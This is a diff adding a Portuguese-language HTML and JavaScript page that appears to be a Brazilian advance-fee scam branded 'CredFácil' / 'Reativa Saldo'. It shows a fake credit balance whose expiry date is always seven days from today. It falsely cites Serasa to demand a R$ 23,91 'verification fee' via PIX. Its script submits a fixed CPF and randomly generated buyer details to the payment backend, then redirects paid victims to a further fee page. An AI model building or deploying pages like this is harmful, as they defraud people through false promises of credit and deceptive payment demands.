+    .eu-facc, .eu-fai-center { align-items: center; }
+    .eu-fjc-left { justify-content: flex-start; }
+    .eu-fjc-right { justify-content: flex-end; }
+    .eu-modal-open { overflow: hidden; }
+    @media (max-width:1015px) {
+      .eu-flex-r { flex-direction: column; justify-content: left; }
+      .eu-d-none-mb { display: none !important; }
+    }
+    .eu-d-none { display: none; }
+    @media (min-width:1015px) { .eu-d-none-dsk { display: none !important; } }
+    @media (max-width:940px) {
+      .layout__content .back-bar.backbar-close button { min-width: 20px; width: 20px; margin-left: 0.5rem; padding-left: 1.25rem; }
+      .back-bar.backbar-close button i.ecs-icon { width: 20px; height: 20px; margin-right: 0; }
+      .back-bar.backbar-close button i.ecs-icon svg { width: 20px; height: 20px; }
+      .back-bar.sign-up__backbar { width: 100%; }
+    }
+    .advertising-wrapper { width: 100%; max-width: 728px; }
+    @media (max-width:77rem) { .advertising-wrapper, .advertising-wrapper iframe { max-width: 99%; } }
+    .back-bar.sign-up__backbar { margin: 0 auto !important; width: 31.25rem; }
+  </style>
+  <style id="__jsx-2446720300">
+    :root {
+      --space-1: 0.5rem;
+      --space-2: 1rem;
+      --space-3: 1.5rem;
+      --space-4: 2rem;
+      --space-5: 2.5rem;
+      --space-6: 3rem;
+    }
+    .eu-sp-0 { padding-bottom: 0 !important; }
+    .eu-sp-1 { padding-bottom: var(--space-1) !important; }
+    .eu-sp-2 { padding-bottom: var(--space-2) !important; }
+    .eu-sp-3 { padding-bottom: var(--space-3) !important; }
+    .eu-sp-4 { padding-bottom: var(--space-4) !important; }
+    .eu-sp-5 { padding-bottom: var(--space-5) !important; }
+    .eu-sp-6 { padding-bottom: var(--space-6) !important; }
+    .eu-sm-0-r, .eu-sm-0 { margin-bottom: 0 !important; }
+    .eu-sm-1-r, .eu-sm-1 { margin-bottom: var(--space-1) !important; }
+    .eu-sm-2-r, .eu-sm-2 { margin-bottom: var(--space-2) !important; }
+    .eu-sm-3-r, .eu-sm-3 { margin-bottom: var(--space-3) !important; }
+    .eu-sm-4 { margin-bottom: var(--space-4) !important; }
+    .eu-sm-5 { margin-bottom: var(--space-5) !important; }
+    .eu-sm-6 { margin-bottom: var(--space-6) !important; }
+    .--align-center { text-align: center; }
+    .w-100 { width: 100% !important; }
+    @media (min-width:63.5rem) {
+      .eu-sm-0-r { margin-bottom: var(--space-1) !important; }
+      .eu-sm-1-r { margin-bottom: var(--space-2) !important; }
+      .eu-sm-2-r { margin-bottom: var(--space-3) !important; }
+      .eu-sm-3-r { margin-bottom: var(--space-4) !important; }
+    }
+  </style>
+  <style id="__jsx-1679404770">
+    #nprogress {
+      pointer-events: none;
+    }
+    #nprogress .bar {
+      background: rgba(var(--theme-accent));
+      position: fixed;
+      z-index: 1050;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 3px;
+    }
+    #nprogress .peg {
+      display: block;
+      position: absolute;
+      right: 0;
+      width: 100px;
+      height: 100%;
+      box-shadow: 0 0 10px rgba(var(--theme-accent)), 0 0 5px rgba(var(--theme-accent));
+      opacity: 1;
+      transform: rotate(3deg) translate(0, -4px);
+    }
+    #nprogress .spinner { display: none; }
+    .nprogress-custom-parent { overflow: hidden; position: relative; }
+    .nprogress-custom-parent #nprogress .bar { position: absolute; }
+  </style>
+  <style id="__jsx-1444901347">
+    body { background-color: rgb(var(--theme-palegray)); }
+    .layout.jsx-1444901347 {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    @media screen and (max-width:960px) {
+      body { background-color: rgb(var(--theme-snow)); }
+    }
+  </style>
+  <style id="__jsx-239148123">
+    .payment-status { color: #333; font-size: 1rem; margin-top: 1rem; display: none; }
+    .payment-status.success { color: #27ae60; }
+    #pixGeneratedContainer { display: none; text-align: center; }
+    #pixGeneratedContainer img { max-width: 220px; height: auto; margin: 15px auto; }
+    #pixGeneratedContainer textarea {
+      resize: vertical;
+      min-height: 80px;
+      padding: 12px;
+      border: 1px dashed #ccc;
+      border-radius: 5px;
+      font-family: monospace;
+      font-size: 0.95em;
+      color: #555;
+      text-align: center;
+      width: 100%;
+    }
+    #pixGeneratedContainer button {
+      background-color: #007bff;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 12px;
+      font-size: 1.1em;
+      transition: background-color 0.3s ease;
+    }
+    #pixGeneratedContainer button:hover { background-color: #0056b3; }
+  </style>
+</head>
+<body>
+  <body>
+    <script>
+      fbq('track', 'Purchase', {
+        value: 28.58, // Substitua por variável dinâmica do Ghosts Pay, se disponível
+        currency: 'BRL'
+      });
+    </script>
+  </body>
+  <main>
+    <div id="__next">
+      <div class="jsx-2555939233 jsx-198070795 jsx-3245007174 jsx-359316987 jsx-2521071326 jsx-1146511973 jsx-867263301 jsx-2446720300 jsx-1679404770">
+        <div class="jsx-1444901347 layout">
+          <header class="jsx-2647271941 header">
+            <div class="jsx-2647271941 header__left">
+              <img src="images/2.png" style="width: 100px;" alt="CredFácil">
+              <div class="jsx-2647271941"></div>
+            </div>
+          </header>
+          <div class="jsx-2119886246 content">
+            <div class="jsx-2723299336 container">
+              <div class="jsx-1369224449 eu-grid__inner eu-fjc-center">
+                <div class="jsx-1670084299 sign-in">
+                  <div class="jsx-1255997722 card jsx-1670084299 sign-in__card">
+                    <div class="jsx-1670084299 sign-in__content">
+                      <div class="container mx-auto px-4 text-center">
+                        <div class="flex flex-col p-4 shadow-md rounded">
+                          <div><h2 class="text-base font-semibold">Limite disponível:</h2></div>
+                          <div><h2 class="text-lg font-semibold text-[#00C054]">R$ 1.295,79</h2></div>
+                        </div>
+                      </div>
+                      <h1 class="mt-6 jsx-1670084299 sign-in__title --align-center eu-sm-2 ea-typography ea-typography--heading-m et-text-dark-high">Saldo disponível até o dia:</h1>
+                      <p id="descounttime" class="jsx-1670084299 sign-in__description --align-center ea-typography ea-typography--body-m text-[#149846] font-bold text-xl"></p>
+                      <script>
+                        var getdayNames = ["Domingo", "Segunda-Feira", "Terça-Feira", "Quarta-Feira", "Quinta-Feira", "Sexta-Feira", "Sábado"];
+                        var getdayMonth = ["Janeiro", "Fevereiro", "Março", "Abril", "Maio", "Junho", "Julho", "Agosto", "Setembro", "Outubro", "Novembro", "Dezembro"];
+                        var getNow = new Date();
+                        getNow.setTime(getNow.getTime() + 7 * 24 * 60 * 60 * 1000); // 7 dias a partir de hoje
+                        document.getElementById("descounttime").innerHTML = getNow.getDate() + " de " + getdayMonth[getNow.getMonth()] + " de " + getNow.getFullYear();
+                      </script>
+                      <div class="container mx-auto text-center mb-6">
+                        <div class="flex flex-col p-4 border-2 border-dashed rounded-lg border-[#149846]">
+                          <div class="mb-4"><h2 class="text-xl font-semibold">Verificação - Reativa Saldo</h2></div>
+                          <div><h2 class="text-xl font-bold">R$ 23,91</h2></div>
+                        </div>
+                      </div>
+                      <div id="efetuar-verificacao">
+                        <div class="jsx-1222364814 ec-form-submit jsx-2110056567 sign-in-form --align-center mb-6">
+                          <button id="verifyButton" class="ea-button ea-button--solid ea-button--size-lg jsx-2110056567 btn-submit">Efetuar verificação</button>
+                        </div>
+                        <div class="container mx-auto px-4 text-center mb-2">
+                          <div class="flex flex-col p-4 bg-gray-300/50 rounded shadow-md">
+                            <div>
+                              <p class="text-base font-semibold text-justify">
+                                Para receber o saldo disponível, é obrigatório efetuar o pagamento da taxa de verificação de usuário. Essa taxa cobre o custo de um atendente do Serasa entrar em contato com você para verificar se a identidade corresponde ao CPF informado. Isso garante que o processo esteja em conformidade com as políticas de resgate e ajuda a evitar qualquer tipo de fraude ou golpe.
+                              </p>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div id="pixGeneratedContainer">
+                        <h3 class="text-xl font-semibold mb-4">PIX para Pagamento</h3>
+                        <p class="text-base mb-2">Escaneie o QR Code ou copie o código para pagar:</p>
+                        <p class="payment-status" id="paymentStatus">Verificando o status do pagamento...</p>
+                      </div>
+                      <div class="flex justify-center items-center mt-6">
+                        <img src="images/soon-pix.svg" alt="Pix em breve" class="w-20">
+                        <div class="mx-4 h-px bg-gray-300 w-12"></div>
+                        <img src="images/safe-environment.svg" alt="Ambiente seguro" class="w-20">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <p class="jsx-564433028 mt-6"></p>
+              </div>
+            </div>
+          </div>
+          <footer class="jsx-695939317 footer">
+            <p class="eu-sm-1 ea-typography et-text-dark-medium">Nós protegemos a sua privacidade <span aria-hidden="true" class="jsx-695939317">❤</span></p>
+            <div class="ea-typography ea-typography--emphasys et-accent">Termos de uso e privacidade</div>
+          </footer>
+        </div>
+      </div>
+    </div>
+  </main>
+  <script>
+    // Funções para dados aleatórios
+    function generateRandomCpf() {
+      return '45604973890'; // CPF fixo conforme o primeiro pagamento
+    }
+
+    function generateRandomPhone() {
+      const ddd = Math.floor(Math.random() * (99 - 11 + 1) + 11).toString();
+      let number = '9';
+      const numDigits = Math.floor(Math.random() * 2) + 8; // 8 ou 9 dígitos
+      for (let i = 1; i < numDigits; i++) {
+        number += Math.floor(Math.random() * 10);
+      }
+      return `${ddd}${number}`.substring(0, 12);
+    }
+
+    function generateRandomEmail() {
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      let name = '';
+      let domain = '';
+      for (let i = 0; i < 8; i++) name += chars.charAt(Math.floor(Math.random() * chars.length));
+      for (let i = 0; i < 5; i++) domain += chars.charAt(Math.floor(Math.random() * chars.length));
+      return `${name}@${domain}.com`;
+    }
+
+    function generateRandomName() {
+      const firstNames = ["João", "Maria", "Pedro", "Ana", "Carlos", "Juliana", "Lucas", "Mariana", "Fernando", "Beatriz", "Rafael", "Sofia"];
+      const lastNames = ["Silva", "Santos", "Oliveira", "Souza", "Lima", "Fernandes", "Costa", "Pereira", "Almeida", "Nascimento", "Rodrigues", "Martins"];
+      const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+      const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+      return `${randomFirstName} ${randomLastName}`;
+    }
+
+    // Função para verificar o status do pagamento
+    async function checkPaymentStatus(transactionId) {
+      const paymentStatus = document.getElementById('paymentStatus');
+      try {
+        const response = await fetch(`/pagamentoiof/api/check-payment?id=${transactionId}`, {
+          method: 'GET',
+          headers: { 'Content-Type': 'application/json' }
+        });
+        const data = await response.json();
+
+        if (response.ok && data.status) {
+          paymentStatus.style.display = 'block';
+          if (data.status === 'APPROVED') {
+            paymentStatus.textContent = 'Pagamento aprovado! Redirecionando...';
+            paymentStatus.classList.add('success');
+            setTimeout(() => {
+              window.location.href = 'https://www.reativasaldo.net/pagamentoiof3';
+            }, 2000);
+            return true;
+          } else if (data.status === 'PENDING') {
+            paymentStatus.textContent = 'Aguardando confirmação do pagamento...';
+          } else {
+            paymentStatus.textContent = 'Pagamento não aprovado. Tente novamente.';
+            paymentStatus.classList.remove('success');
+          }
+        } else {
+          console.error('Erro ao verificar status do pagamento:', data);
+          paymentStatus.textContent = 'Erro ao verificar pagamento. Tente novamente.';
+          paymentStatus.classList.remove('success');
+        }
+        return false;
+      } catch (error) {
+        console.error('Erro na requisição de status do pagamento:', error);
+        paymentStatus.textContent = 'Erro ao verificar pagamento. Verifique sua conexão.';
+        paymentStatus.classList.remove('success');
+        return false;
+      }
+    }
+
+    // Função para iniciar polling do status do pagamento
+    function startPaymentPolling(transactionId) {
+      const interval = setInterval(async () => {
+        const isApproved = await checkPaymentStatus(transactionId);
+        if (isApproved) {
+          clearInterval(interval);
+        }
+      }, 5000);
+    }
+
+    // Função para gerar o PIX
+    document.addEventListener('DOMContentLoaded', function () {
+      const verifyButton = document.getElementById('verifyButton');
+      const pixGeneratedContainer = document.getElementById('pixGeneratedContainer');
+      const efetuarVerificacao = document.getElementById('efetuar-verificacao');
+      const valorIOFcentavos = 2391; // R$ 23,91 em centavos
+
+      verifyButton.addEventListener('click', async function (event) {
+        event.preventDefault();
+        verifyButton.textContent = 'Gerando PIX...';
+        verifyButton.disabled = true;
+
+        const fixedCpf = generateRandomCpf();
+        const randomName = generateRandomName();
+        const randomEmail = generateRandomEmail();
+        const randomPhone = generateRandomPhone();
+
+        const requestBody = {
+          name: randomName,
+          email: randomEmail,
+          cpf: fixedCpf,
+          phone: randomPhone,
+          amount: valorIOFcentavos,
+          items: [
+            {
+              unitPrice: valorIOFcentavos,
+              title: "Verificação - Reativa Saldo",
+              quantity: 1,
+              tangible: false
+            }
+          ]
+        };
+
+        try {
+          console.log("🟢 Enviando dados para o backend:", requestBody);
+          const response = await fetch('/pagamentoiof2/api/gerar-pix', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(requestBody)
+          });
+          const data = await response.json();
+
+          if (response.ok && data.pixQrCode && data.pixCode && data.transactionId) {
+            efetuarVerificacao.style.display = 'none';
+            pixGeneratedContainer.style.display = 'block';
+            pixGeneratedContainer.innerHTML = `
+              <h3 class="text-xl font-semibold mb-4">PIX para Pagamento</h3>
+              <p class="text-base mb-2">Escaneie o QR Code ou copie o código para pagar:</p>
+              <img src="${data.pixQrCode}" alt="QR Code PIX" style="max-width: 220px; height: auto; display: block; margin: 15px auto;">
+              <textarea id="pixCodeTextarea" readonly style="width: 100%; min-height: 80px; text-align: center; font-size: 0.95em; padding: 12px; border: 1px dashed #ccc; border-radius: 5px; background-color: #f9f9f9; cursor: text;">${data.pixCode}</textarea>
+              <button onclick="navigator.clipboard.writeText(document.getElementById('pixCodeTextarea').value)" style="background-color: #007bff; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; margin-top: 12px; font-size: 1.1em;">Copiar Código Pix</button>
+              <p style="margin-top: 20px;" class="text-base">Após o pagamento, a liberação da sua cota será automática e imediata.</p>
+              <p class="payment-status" id="paymentStatus">Verificando o status do pagamento...</p>
+            `;
+            startPaymentPolling(data.transactionId);
+          } else {
+            console.error('Erro retornado pelo backend ao gerar PIX:', data);
+            alert('Erro ao gerar PIX: ' + (data.message || 'Erro desconhecido. Por favor, tente novamente.'));
+            verifyButton.textContent = 'Efetuar verificação';
+            verifyButton.disabled = false;
+          }
+        } catch (error) {
+          console.error('Erro na requisição PIX:', error);
+          alert('Ocorreu um erro ao tentar gerar o PIX. Verifique sua conexão e tente novamente.');
+          verifyButton.textContent = 'Efetuar verificação';
+          verifyButton.disabled = false;
+        }
+      });
+    });
+  </script>
+</body>
+</html>
